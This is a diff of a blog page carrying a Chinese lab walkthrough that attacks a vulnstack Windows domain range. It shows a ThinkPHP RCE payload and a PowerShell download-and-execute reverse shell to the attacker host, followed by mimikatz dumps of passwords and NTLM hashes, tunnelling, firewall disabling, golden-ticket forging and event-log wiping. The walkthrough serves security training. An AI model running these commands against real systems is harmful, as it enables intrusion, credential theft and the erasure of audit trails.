@@ -108,7 +108,7 @@
      --><!--
        --><li><a href="/about/">About</a></li><!--
      --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
+       --><li><a href="/archives/">Articles</a></li><!--
      --><!--
        --><li><a href="/tags/">tags</a></li><!--
      --><!--
@@ -198,53 +198,53 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <p>靶场下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/7/">http://vulnstack.qiyuanxuetang.net/vuln/detail/7/</a></p>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>靶场下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/7/">http://vulnstack.qiyuanxuetang.net/vuln/detail/7/</a></p>
 <h2 id="环境部署："><a href="#环境部署：" class="headerlink" title="环境部署："></a>环境部署：</h2><h3 id="Win7"><a href="#Win7" class="headerlink" title="Win7"></a>Win7</h3><p>Win7做Web服务器，有两条网卡，分别连通内外网：</p>
-<p><img src="https://pic.imgdb.cn/item/65752474c458853aef4009ea.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65752474c458853aef4009ea.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752474c458853aef4009ea.jpg"></a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">内网IP：192.168.138.136</span><br><span class="line">外网IP：192.168.135.150</span><br><span class="line">注意手动打开phpstudy</span><br></pre></td></tr></table></figure>
 
 <h3 id="Windows-2008"><a href="#Windows-2008" class="headerlink" title="Windows 2008"></a>Windows 2008</h3><p>Windows 2008只有一个网卡连接，处于内网无法与外网通信：</p>
-<p><img src="https://pic.imgdb.cn/item/65752484c458853aef403e3e.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65752484c458853aef403e3e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752484c458853aef403e3e.jpg"></a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内网IP：192.168.138.138</span><br></pre></td></tr></table></figure>
 
 <h3 id="攻击机："><a href="#攻击机：" class="headerlink" title="攻击机："></a>攻击机：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">外网IP：192.168.135.128</span><br></pre></td></tr></table></figure>
 
 <p>VMnet2网卡设置如下：</p>
-<p><img src="https://pic.imgdb.cn/item/65752494c458853aef407636.jpg"></p>
-<h2 id="外网渗透："><a href="#外网渗透：" class="headerlink" title="外网渗透："></a>外网渗透：</h2><p><img src="https://pic.imgdb.cn/item/6575249fc458853aef409a39.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65752494c458853aef407636.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752494c458853aef407636.jpg"></a></p>
+<h2 id="外网渗透："><a href="#外网渗透：" class="headerlink" title="外网渗透："></a>外网渗透：</h2><p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/6575249fc458853aef409a39.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575249fc458853aef409a39.jpg"></a></p>
 <p>进入网页后，可以发现部署的是5.0版本的ThinkPHP，去网上搜一搜能发现不少payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>
 
 <p>利用网上的payload打一下：</p>
-<p><img src="https://pic.imgdb.cn/item/657524abc458853aef40c2d9.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/657524abc458853aef40c2d9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524abc458853aef40c2d9.jpg"></a></p>
 <p>RCE成功。接下来利用powercat反弹一下shell：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=powershell.exe IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.135.128:1235/powercat.ps1&#x27;);powercat -c 192.168.135.128 -p 1234 -e cmd.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://pic.imgdb.cn/item/657524bbc458853aef41018c.jpg"></p>
-<p><img src="https://pic.imgdb.cn/item/657524c8c458853aef412cdc.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/657524bbc458853aef41018c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524bbc458853aef41018c.jpg"></a></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/657524c8c458853aef412cdc.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524c8c458853aef412cdc.jpg"></a></p>
 <p>反弹成功。</p>
 <p>接下来利用metasploit制作一个exe，在靶机中下载下来然后执行，把meterpreter反弹出来:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.135.128 LPORT=1236 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://pic.imgdb.cn/item/657524d9c458853aef416d3b.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/657524d9c458853aef416d3b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524d9c458853aef416d3b.jpg"></a></p>
 <p>接下来msf监听，在拿到的shell中执行下载的木马文件，拿到meterpreter：</p>
-<p><img src="https://pic.imgdb.cn/item/657524e7c458853aef419ea3.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/657524e7c458853aef419ea3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524e7c458853aef419ea3.jpg"></a></p>
 <h2 id="内网信息收集："><a href="#内网信息收集：" class="headerlink" title="内网信息收集："></a>内网信息收集：</h2><p>在meterpreter执行getsystem即可拿到system权限。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">net view                 # 查看局域网内其他主机名</span><br><span class="line">net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 # 查看本机用户列表</span><br><span class="line">net user /domain         # 查看域用户</span><br><span class="line">net localgroup administrators # 查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         # 查看有几个域</span><br><span class="line">net user 用户名 /domain   # 获取指定域用户的信息</span><br><span class="line">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net time /domain    #判断主域，主域服务器一般做时间服务器</span><br><span class="line">net group 组名 /domain    # 查看域中某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain  # 查看域管理员的名字</span><br><span class="line">net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名</span><br><span class="line">net group &quot;domain controllers&quot; /domain  # 查看域控制器主机名（可能有多台）</span><br><span class="line">ipconfig /all #查询本机IP段，所在域等</span><br></pre></td></tr></table></figure>
 
 <p>执行ipconfig &#x2F;all可以发现Web服务器的内网IP为192.168.138.136，并且DNS server为192.168.138.138：</p>
-<p><img src="https://pic.imgdb.cn/item/657524f6c458853aef41d0d5.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/657524f6c458853aef41d0d5.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524f6c458853aef41d0d5.jpg"></a></p>
 <p>IP为192.168.138.138的这台机器应该就是DC了。根据ipconfig &#x2F;all返回的内容也可以得知当前所在域为sun.com。可以判断出我们最开始拿到的shell的用户就是域管：</p>
-<p><img src="https://pic.imgdb.cn/item/65752502c458853aef41f353.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65752502c458853aef41f353.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752502c458853aef41f353.jpg"></a></p>
 <p>域中的用户如下：</p>
-<p><img src="https://pic.imgdb.cn/item/6575250dc458853aef422191.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/6575250dc458853aef422191.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575250dc458853aef422191.jpg"></a></p>
 <p>内网主机如下所示：</p>
-<p><img src="https://pic.imgdb.cn/item/65752519c458853aef424918.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65752519c458853aef424918.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752519c458853aef424918.jpg"></a></p>
 <p>查看有多少域：</p>
-<p><img src="https://pic.imgdb.cn/item/65752524c458853aef426feb.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65752524c458853aef426feb.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752524c458853aef426feb.jpg"></a></p>
 <p>由于msf的mimikatz一直不好用，我们自己上传一个，然后拿一下密码：</p>
-<p><img src="https://pic.imgdb.cn/item/6575252fc458853aef429997.jpg"></p>
-<p><img src="https://pic.imgdb.cn/item/6575253ac458853aef42bf12.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/6575252fc458853aef429997.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575252fc458853aef429997.jpg"></a></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/6575253ac458853aef42bf12.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575253ac458853aef42bf12.jpg"></a></p>
 <p>拿一下系统密码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug#权限提升</span><br><span class="line">sekurlsa::logonPasswords#明文抓取</span><br></pre></td></tr></table></figure>
 
@@ -256,13 +256,13 @@
 <p>域用户leo的账号及密码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leo</span><br><span class="line">123.com</span><br></pre></td></tr></table></figure>
 
-<h2 id="路由转发及隐藏通信隧道"><a href="#路由转发及隐藏通信隧道" class="headerlink" title="路由转发及隐藏通信隧道"></a>路由转发及隐藏通信隧道</h2><p><img src="https://pic.imgdb.cn/item/65752552c458853aef43082d.jpg"></p>
+<h2 id="路由转发及隐藏通信隧道"><a href="#路由转发及隐藏通信隧道" class="headerlink" title="路由转发及隐藏通信隧道"></a>路由转发及隐藏通信隧道</h2><p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65752552c458853aef43082d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752552c458853aef43082d.jpg"></a></p>
 <p>接下来尝试利用EarthWarm来搭建一个隐藏通信隧道，首先为Win7上传一个ew_for_Win.exe，接下来就可以搭建了：</p>
-<p><img src="https://pic.imgdb.cn/item/65752561c458853aef433981.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65752561c458853aef433981.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752561c458853aef433981.jpg"></a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 1238 -e 1237(攻击机执行)</span><br><span class="line">ew_for_Win.exe -s rssocks -d 192.168.135.128 -e 1237(靶机执行)</span><br></pre></td></tr></table></figure>
 
 <p>成功搭建：</p>
-<p><img src="https://pic.imgdb.cn/item/6575256cc458853aef43659f.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/6575256cc458853aef43659f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575256cc458853aef43659f.jpg"></a></p>
 <p>我们修改proxychains4.conf添加如下代理：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 1238</span><br></pre></td></tr></table></figure>
 
@@ -273,53 +273,58 @@
 <p>开启了445端口，尝试利用ms17_010未果，但因为已经拿到了域管的账号和密码，所以尝试利用psexec进行无IPC登陆域控。</p>
 <h2 id="psexec登陆域控"><a href="#psexec登陆域控" class="headerlink" title="psexec登陆域控"></a>psexec登陆域控</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.138.138</span><br><span class="line">set SMBDomain SUN</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">set SMBPass dc123.com</span><br><span class="line">set payload windows/meterpreter/bind_tcp #因为已经配置好了路由，且域控不出网</span><br><span class="line">set lport 1239</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://pic.imgdb.cn/item/65752579c458853aef439129.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65752579c458853aef439129.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752579c458853aef439129.jpg"></a></p>
 <p>没有登陆成功，猜测是开启了防火墙，尝试关闭防火墙：</p>
 <p>首先开启Win7与Windows2008之间的IPC连接：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.138.138\ipc$ &quot;dc123.com&quot; /user:&quot;Administrator&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://pic.imgdb.cn/item/6575258bc458853aef43ce05.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/6575258bc458853aef43ce05.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575258bc458853aef43ce05.jpg"></a></p>
 <p>接着用sc通过创建服务来远程执行：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.138.138 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">sc \\192.168.138.138 start unablefirewall</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://pic.imgdb.cn/item/65752597c458853aef43f331.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65752597c458853aef43f331.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752597c458853aef43f331.jpg"></a></p>
 <p>此时再次启动利用psexec登陆域控：</p>
-<p><img src="https://pic.imgdb.cn/item/657525a3c458853aef441bad.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/657525a3c458853aef441bad.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525a3c458853aef441bad.jpg"></a></p>
 <p>成功登陆。刚刚利用nmap扫域控的时候没有发现开启3389端口，进去输入netstat -ano看看情况：</p>
-<p><img src="https://pic.imgdb.cn/item/657525afc458853aef4440e9.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/657525afc458853aef4440e9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525afc458853aef4440e9.jpg"></a></p>
 <p>并未发现3389端口开启。先看看有没有开启RDP：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</span><br><span class="line"># 查看RDP服务是否开启：1关闭，0开启  </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://pic.imgdb.cn/item/657525bfc458853aef44708e.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/657525bfc458853aef44708e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525bfc458853aef44708e.jpg"></a></p>
 <p>可以发现RDP是关闭的。那么我们给它打开：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://pic.imgdb.cn/item/657525cec458853aef44a508.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/657525cec458853aef44a508.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525cec458853aef44a508.jpg"></a></p>
 <p>因为我们刚刚已经关闭了防火墙，所以在此处我们不需要添加防火墙规则允许3389端口了。再查看一下端口情况：</p>
-<p><img src="https://pic.imgdb.cn/item/657525ddc458853aef44dc66.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/657525ddc458853aef44dc66.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525ddc458853aef44dc66.jpg"></a></p>
 <p>接下来再利用隧道登陆到域控的远程桌面上：</p>
-<p><img src="https://pic.imgdb.cn/item/657525e7c458853aef45021f.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/657525e7c458853aef45021f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525e7c458853aef45021f.jpg"></a></p>
 <p>成功登陆：</p>
-<p><img src="https://pic.imgdb.cn/item/657525f4c458853aef453046.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/657525f4c458853aef453046.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525f4c458853aef453046.jpg"></a></p>
 <h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>首先拿到krbtgt的ntlm hash值和域SID值：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump::lsa /patch</span><br><span class="line">Domain : SUN / S-1-5-21-3388020223-1982701712-4030140183</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 8c535a2d84c3b21059d667639bb89db5</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line">LM   : </span><br><span class="line">NTLM : </span><br><span class="line"></span><br><span class="line">RID  : 000001f6 (502)</span><br><span class="line">User : krbtgt</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 65dc23a67f31503698981f2665f9d858</span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : admin</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 8c535a2d84c3b21059d667639bb89db5</span><br><span class="line"></span><br><span class="line">RID  : 00000456 (1110)</span><br><span class="line">User : leo</span><br><span class="line">LM   : </span><br><span class="line">NTLM : afffeba176210fad4628f0524bfe1942</span><br><span class="line"></span><br><span class="line">RID  : 000003e9 (1001)</span><br><span class="line">User : DC$</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 7178f86541258a83bf19728f010c64da</span><br><span class="line"></span><br><span class="line">RID  : 00000451 (1105)</span><br><span class="line">User : WIN7$</span><br><span class="line">LM   : </span><br><span class="line">NTLM : dc1cbe1583c92a3740cfcd97e8f0a377</span><br></pre></td></tr></table></figure>
 
 <p>再Win7上先清除票据缓存：</p>
-<p><img src="https://pic.imgdb.cn/item/65752602c458853aef456137.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65752602c458853aef456137.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752602c458853aef456137.jpg"></a></p>
 <p>生成黄金票据并注入内存：</p>
-<p><img src="https://pic.imgdb.cn/item/6575260ec458853aef458562.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/6575260ec458853aef458562.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575260ec458853aef458562.jpg"></a></p>
 <p>执行klist查看票据：</p>
-<p><img src="https://pic.imgdb.cn/item/65752619c458853aef45a800.jpg"></p>
-<p><img src="https://pic.imgdb.cn/item/65752623c458853aef45c7ce.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65752619c458853aef45a800.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752619c458853aef45a800.jpg"></a></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65752623c458853aef45c7ce.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752623c458853aef45c7ce.jpg"></a></p>
 <h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><p>查看事件日志:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run event_manager -i</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://pic.imgdb.cn/item/6575262ec458853aef45e6f4.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/6575262ec458853aef45e6f4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575262ec458853aef45e6f4.jpg"></a></p>
 <p>清除事件日志（包括六种日志类型）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run event_manager -c</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://pic.imgdb.cn/item/6575263bc458853aef4612a7.jpg"></p>
-
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/6575263bc458853aef4612a7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575263bc458853aef4612a7.jpg"></a></p>
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
   </div>
 </article>
 
@@ -342,7 +347,7 @@
         
           <li><a href="/about/">About</a></li>
         
-          <li><a href="/archives/">Writing</a></li>
+          <li><a href="/archives/">Articles</a></li>
         
           <li><a href="/tags/">tags</a></li>
         
@@ -404,7 +409,7 @@
      --><!--
        --><li><a href="/about/">About</a></li><!--
      --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
+       --><li><a href="/archives/">Articles</a></li><!--
      --><!--
        --><li><a href="/tags/">tags</a></li><!--
      --><!--
